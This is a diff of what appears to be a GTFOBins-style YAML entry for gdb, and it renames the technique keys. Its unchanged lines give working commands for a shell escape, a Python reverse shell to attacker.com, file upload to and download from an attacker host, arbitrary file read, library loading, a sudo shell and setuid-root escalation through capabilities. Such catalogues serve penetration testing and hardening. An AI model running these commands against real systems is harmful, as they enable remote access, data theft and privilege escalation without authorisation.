@@ -1,8 +1,8 @@
 ---
 functions:
-  execute-interactive:
+  shell:
     - code: gdb -nx -ex '!sh' -ex quit
-  reverse-shell-interactive:
+  reverse-shell:
     - description: This requires that GDB is compiled with Python support. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
       code: |
         export RHOST=attacker.com
@@ -11,7 +11,7 @@ functions:
         s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
         [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
         pty.spawn("/bin/sh")' -ex quit
-  upload:
+  file-upload:
     - description: This requires that GDB is compiled with Python support. Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.
       code: |
         export URL=http://attacker.com/
@@ -27,7 +27,7 @@ functions:
         if sys.version_info.major == 3: import http.server as s, socketserver as ss
         else: import SimpleHTTPServer as s, SocketServer as ss
         ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()' -ex quit
-  download:
+  file-download:
     - description: This requires that GDB is compiled with Python support. Fetch a remote file via HTTP GET request.
       code: |
         export URL=http://attacker.com/file_to_get
@@ -44,12 +44,12 @@ functions:
   file-read:
     - description: This requires that GDB is compiled with Python support.
       code: gdb -nx -ex 'python print(open("file_to_read").read())' -ex quit
-  load-library:
+  library-load:
     - description: This requires that GDB is compiled with Python support.
       code: gdb -nx -ex 'python from ctypes import cdll; cdll.LoadLibrary("lib.so")' -ex quit
-  sudo-enabled:
+  sudo:
     - code: sudo gdb -nx -ex '!sh' -ex quit
-  capabilities-enabled:
+  capabilities:
     - description: This requires that GDB is compiled with Python support.
       code: ./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
 ---
